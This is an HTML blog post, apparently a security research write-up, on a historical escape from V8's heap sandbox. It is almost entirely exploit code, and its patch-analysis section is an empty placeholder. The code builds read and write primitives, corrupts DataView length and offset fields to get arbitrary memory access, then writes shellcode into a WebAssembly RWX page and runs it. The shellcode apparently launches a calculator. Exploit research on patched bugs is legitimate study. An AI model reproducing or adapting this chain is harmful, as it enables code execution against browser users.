<!doctype html><html lang=en>
<head><title>
Exploring Historical V8 Heap Sandbox Escapes II &ndash; Anvbis
</title>
<meta name=description content>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
<link rel=stylesheet href=https://anvbis.github.io/css/syntax/theme.css>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis@anvbis</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
</ul>
</nav>
<ul class=aside__social-links>
<li>
<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=mailto:contact@anvbis.au rel=me aria-label=Email title=Email><i class="fa fa-envelope" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</header>
<section class=page__body>
<header class=content__header>
<h1>Exploring Historical V8 Heap Sandbox Escapes II</h1>
</header>
<div class=content__body>
<h2 id=overview>Overview</h2>
<p>Corruption of the DataView object&rsquo;s <code>byte_length</code> and <code>byte_offset</code> fields results in arbitrary read and write primitives external to the heap sandbox.</p>
<p>You can find the patch for this heap sandbox escape here: <a href=https://chromium-review.googlesource.com/c/v8/v8/+/3876823>[sandbox] Introduce BoundedSize</a>.</p>
<h2 id=patch-analysis>Patch Analysis</h2>
<p>&mldr;</p>
<h2 id=exploit-primitives>Exploit Primitives</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>addrof</span> <span class=o>=</span> <span class=nx>o</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=k>return</span> <span class=nx>Sandbox</span><span class=p>.</span><span class=nx>getAddressOf</span><span class=p>(</span><span class=nx>o</span><span class=p>);</span>
<span class=p>};</span>

<span class=kr>const</span> <span class=nx>weak_read</span> <span class=o>=</span> <span class=nx>p</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>reader</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Sandbox</span><span class=p>.</span><span class=nx>MemoryView</span><span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=mi>64</span><span class=p>);</span>
  <span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>reader</span><span class=p>);</span>
  <span class=k>return</span> <span class=nx>view</span><span class=p>.</span><span class=nx>getBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span> 
<span class=p>};</span>

<span class=kr>const</span> <span class=nx>weak_write</span> <span class=o>=</span> <span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>writer</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Sandbox</span><span class=p>.</span><span class=nx>MemoryView</span><span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=mi>64</span><span class=p>);</span>
  <span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>writer</span><span class=p>);</span>
  <span class=nx>view</span><span class=p>.</span><span class=nx>setBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>x</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
<span class=p>};</span>
</code></pre></div><h2 id=dataview-object-overview>DataView Object Overview</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>buf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>

<span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>view</span><span class=p>);</span>
</code></pre></div><h2 id=dataview-byte-offset-corruption>DataView Byte Offset Corruption</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>buf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>

<span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>view</span><span class=p>);</span>
<span class=o>%</span><span class=nx>SystemBreak</span><span class=p>();</span>
<span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>view</span><span class=p>);</span>
</code></pre></div><h2 id=arbitrary-read-primitive>Arbitrary Read Primitive</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>heap</span> <span class=o>=</span> <span class=p>(</span><span class=nx>weak_read</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>;</span>
<span class=kd>let</span> <span class=nx>store</span> <span class=o>=</span> <span class=nx>heap</span> <span class=o>+</span> <span class=p>((</span><span class=nx>weak_read</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>buf</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=nx>n</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>offset</span> <span class=o>=</span> <span class=mh>0xffffffffffffffff</span><span class=nx>n</span> <span class=o>-</span> <span class=nx>store</span> <span class=o>+</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>

<span class=nx>weak_write</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>view</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>,</span> <span class=nx>offset</span><span class=p>);</span>              <span class=cm>/* view.byte_offset */</span>
<span class=nx>weak_write</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>view</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0xffffffffffffffff</span><span class=nx>n</span><span class=p>);</span> <span class=cm>/* view.byte_length */</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_read</span> <span class=o>=</span> <span class=nx>p</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=k>return</span> <span class=nx>view</span><span class=p>.</span><span class=nx>getBigUint64</span><span class=p>(</span><span class=nb>Number</span><span class=p>(</span><span class=nx>p</span><span class=p>),</span> <span class=kc>true</span><span class=p>);</span>
<span class=p>};</span>
</code></pre></div><h2 id=arbitrary-write-primitive>Arbitrary Write Primitive</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_write</span> <span class=o>=</span> <span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=k>return</span> <span class=nx>view</span><span class=p>.</span><span class=nx>setBigUint64</span><span class=p>(</span><span class=nb>Number</span><span class=p>(</span><span class=nx>p</span><span class=p>),</span> <span class=nx>x</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
<span class=p>};</span>
</code></pre></div><h2 id=code-execution>Code Execution</h2>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>wasm</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span>
  <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span>
  <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span>
  <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span>
  <span class=mh>0x0b</span>
<span class=p>]);</span>
<span class=kd>let</span> <span class=nx>module</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=nx>wasm</span><span class=p>);</span>

<span class=kd>let</span> <span class=nx>instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>module</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>rwx</span> <span class=o>=</span> <span class=nx>weak_read</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>instance</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>);</span>

<span class=kd>let</span> <span class=nx>shellcode</span> <span class=o>=</span> <span class=p>[</span>
  <span class=mh>0x732f6e69622fb848</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x66525f5450990068</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x15e8525e54632d68</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x4c50534944000000</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x302e303a273d5941</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x00636c6163782027</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x0f583b6a5e545756</span><span class=nx>n</span><span class=p>,</span>
  <span class=mh>0x0000000000000005</span><span class=nx>n</span>
<span class=p>];</span>

<span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>shellcode</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
  <span class=nx>strong_write</span><span class=p>(</span><span class=nx>rwx</span> <span class=o>+</span> <span class=p>(</span><span class=mi>8</span><span class=nx>n</span> <span class=o>*</span> <span class=nx>BigInt</span><span class=p>(</span><span class=nx>i</span><span class=p>)),</span> <span class=nx>shellcode</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>

<span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>main</span><span class=p>();</span>
</code></pre></div><h2 id=references>References</h2>
<ul>
<li><a href=https://chromium-review.googlesource.com/c/v8/v8/+/3876823>[sandbox] Introduce BoundedSize</a></li>
</ul>
</div>
<footer class=content__footer></footer>
</section>
<footer class=page__footer><p>
</p>
<p>&copy; 2023 Anvbis</p>
<p>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p>
</footer>
</div>
</body>
</html>